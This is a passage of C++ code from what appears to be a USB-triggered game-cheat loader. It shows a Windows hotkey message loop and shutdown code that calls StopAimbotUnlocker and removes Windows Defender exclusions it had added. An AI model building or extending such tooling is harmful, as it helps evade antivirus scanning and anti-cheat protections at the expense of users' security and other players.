                        std::wcout << L"Hotkey: Running cleaner..." << std::endl;
                        RunCleaner();
                        break;
                }
            } else {
                switch (msg.wParam) {
                    case 1:
                        if (usbPluggedIn) StartApp();
                        break;
                    case 2:
                        StopApp();
                        break;
                    case 3:
                        RunCleaner();
                        break;
                }
            }
        }
        
        static Settings lastHotkeySettings = currentSettings;
        if (currentSettings.startAppKeys != lastHotkeySettings.startAppKeys ||
            currentSettings.stopAppKeys != lastHotkeySettings.stopAppKeys ||
            currentSettings.runCleanerKeys != lastHotkeySettings.runCleanerKeys) {
            RegisterHotKeys();
            lastHotkeySettings = currentSettings;
        }
        
        if (msg.message == WM_QUIT) {
            shouldExit = true;
        }
    }
    
    if (currentSettings.showMonitor) {
        std::wcout << L"Shutting down..." << std::endl;
    }
    
    shouldExit = true;
    StopApp();
    StopAimbotUnlocker();
    
    if (exclusionActive) {
        if (currentSettings.showMonitor) {
            std::wcout << L"Cleaning up Defender exclusions..." << std::endl;
        }
        ToggleDefenderExclusion(false);
    }
    
    UnregisterHotKey(NULL, 1);
    UnregisterHotKey(NULL, 2);
    UnregisterHotKey(NULL, 3);
    
    if (usbThread.joinable()) usbThread.join();
    if (settingsThread.joinable()) settingsThread.join();
    
    if (currentSettings.showMonitor) {
        std::wcout << L"Shutdown complete." << std::endl;
    }
    
    return 0;
}